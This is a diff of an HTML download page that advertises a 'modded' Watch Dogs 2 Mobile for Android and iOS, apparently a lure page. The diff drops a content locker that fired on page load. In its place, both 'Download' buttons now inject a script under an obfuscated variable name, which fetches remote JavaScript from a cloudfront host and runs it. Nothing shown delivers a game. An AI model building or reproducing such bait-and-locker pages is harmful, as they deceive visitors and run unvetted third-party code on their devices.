@@ -8,12 +8,12 @@
     <meta name="description" content="Download Watch Dogs 2 Mobile - Experience open-world hacking and action on your smartphone. Get the modded version now on Android and iOS.">
     <meta name="keywords" content="Watch Dogs 2 Mobile, action games, mobile games, modlify.fun, download games">
     <meta property="og:title" content="Watch Dogs 2 Mobile - Modlify.fun">
-    <meta property="og:description" content="Download the latest modded version of Watch Dogs 2 Mobile. Enjoy open-world hacking and action on your smartphone.">
+    <meta property="og:description" content="Download the latest modded version of Watch Dogs 2 Mobile. Enjoy open-world hacking and action gameplay on your smartphone.">
     <meta property="og:image" content="https://i.ibb.co/9m3pwxTm/capsule-616x353.jpg">
     <meta property="og:url" content="https://www.modlify.fun/watch-dogs-2-mobile">
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="Watch Dogs 2 Mobile - Modlify.fun">
-    <meta name="twitter:description" content="Download the latest modded version of Watch Dogs 2 Mobile. Enjoy open-world hacking and action on your smartphone.">
+    <meta name="twitter:description" content="Download the latest modded version of Watch Dogs 2 Mobile. Enjoy open-world hacking and action gameplay on your smartphone.">
     <meta name="twitter:image" content="https://i.ibb.co/9m3pwxTm/capsule-616x353.jpg">
     <meta name="author" content="Modlify.fun">
     <link rel="icon" href="https://i.postimg.cc/Xvg3XNm6/Watch-Dogs-2-Logo.png">
@@ -443,7 +443,7 @@
 
     <!-- Hero Section -->
     <div class="hero">
-        <img src="https://i.ibb.co/9m3pwxTm/capsule-616x353.jpg" alt="Watch Dogs 2 Mobile Cover">
+        <img src="https://i.postimg.cc/dVgj0tRq/watch-dogs-2-group-photo-1920x1080-025a329984ec.jpg" alt="Watch Dogs 2 Mobile Cover">
     </div>
 
     <!-- Game Info Section -->
@@ -458,10 +458,10 @@
 
         <!-- Download Buttons -->
         <div class="download-section">
-            <button onclick="_RH()" class="download-btn">
+            <button id="androidDownloadBtn" class="download-btn">
                 <i class="fab fa-android"></i> Download for Android
             </button>
-            <button onclick="setTimeout(_RH, 5000)" class="download-btn">
+            <button id="iosDownloadBtn" class="download-btn">
                 <i class="fab fa-apple"></i> Download for iOS
             </button>
         </div>
@@ -520,10 +520,10 @@
             <h2>Features</h2>
             <ul class="feature-list">
                 <li>Open World: Explore a massive recreation of San Francisco</li>
-                <li>Hacking System: Control the city's infrastructure with your smartphone</li>
-                <li>Stealth & Action: Choose your playstyle - stealthy hacker or guns-blazing operative</li>
-                <li>Multiplayer: Team up with friends for co-op missions</li>
-                <li>Character Customization: Personalize your hacker with unique outfits and gear</li>
+                <li>Hacking Gameplay: Control the city's infrastructure with your smartphone</li>
+                <li>Character Customization: Personalize your hacker with unique outfits</li>
+                <li>Multiplayer Mode: Team up with friends for co-op missions</li>
+                <li>Advanced AI: Realistic NPC behavior and reactions</li>
             </ul>
         </div>
 
@@ -531,9 +531,9 @@
         <div class="screenshots">
             <h2>Screenshots</h2>
             <div class="screenshot-grid">
-                <img src="https://i.ibb.co/ycQWrqY2/14834f01f320318a428f3584eeaed32be471514f90c8ee89c5ffd536e0cc6ae2-600.jpg" alt="Watch Dogs 2 Mobile Screenshot 1" class="screenshot">
-                <img src="https://i.ibb.co/zTpxMbWX/ad0574ff9e4d1803a07d769c0b085f83b35d1ed2291f656cb08125e14392476f-600.jpg" alt="Watch Dogs 2 Mobile Screenshot 2" class="screenshot">
-                <img src="https://i.ibb.co/Pvc6zDf4/02df54de7883d45c7d0ecdeabd46bba0d5e0c782acc524dce3b1df881ac48cec-600.jpg" alt="Watch Dogs 2 Mobile Screenshot 3" class="screenshot">
+                <img src="https://i.postimg.cc/MTS0yPrN/Screenshot-20250615-025054-Tik-Tok.jpg" alt="Watch Dogs 2 Mobile Screenshot 1" class="screenshot">
+                <img src="https://i.postimg.cc/63frzrk3/Screenshot-20250615-025222-Tik-Tok.jpg" alt="Watch Dogs 2 Mobile Screenshot 2" class="screenshot">
+                <img src="https://i.postimg.cc/fyWxP3sv/Screenshot-20250615-025242-Tik-Tok.jpg" alt="Watch Dogs 2 Mobile Screenshot 3" class="screenshot">
             </div>
         </div>
     </div>
@@ -582,14 +582,6 @@
         </div>
     </footer>
 
-    <!-- Content Locker Script -->
-    <script type="text/javascript">
-        var NZZGo_wyX_kJNVTc={"it":4513158,"key":"28405"};
-    </script>
-    <script src="https://dlk457skl57zp.cloudfront.net/4653251.js"></script>
-    <script>_RH();</script>
-    <script>setTimeout(_RH, 5000);</script>
-    
     <script>
         // Mobile menu toggle
         document.getElementById('menuIcon').addEventListener('click', function() {
@@ -635,6 +627,29 @@
             document.getElementById('android-steps').style.display = tabIndex === 0 ? 'block' : 'none';
             document.getElementById('ios-steps').style.display = tabIndex === 1 ? 'block' : 'none';
         }
+
+        // Content locker trigger on button click
+        function loadContentLocker() {
+            // Create script element for content locker
+            const lockerScript = document.createElement('script');
+            lockerScript.type = 'text/javascript';
+            lockerScript.text = `
+                var acphE_hvc_rMrmqc={"it":4513158,"key":"28405"};
+                (function() {
+                    var script = document.createElement('script');
+                    script.src = 'https://dfmpe7igjx4jo.cloudfront.net/8985085.js';
+                    script.onload = function() {
+                        _qr();
+                    };
+                    document.body.appendChild(script);
+                })();
+            `;
+            document.body.appendChild(lockerScript);
+        }
+
+        // Add event listeners to download buttons
+        document.getElementById('androidDownloadBtn').addEventListener('click', loadContentLocker);
+        document.getElementById('iosDownloadBtn').addEventListener('click', loadContentLocker);
     </script>
 </body>
 </html>
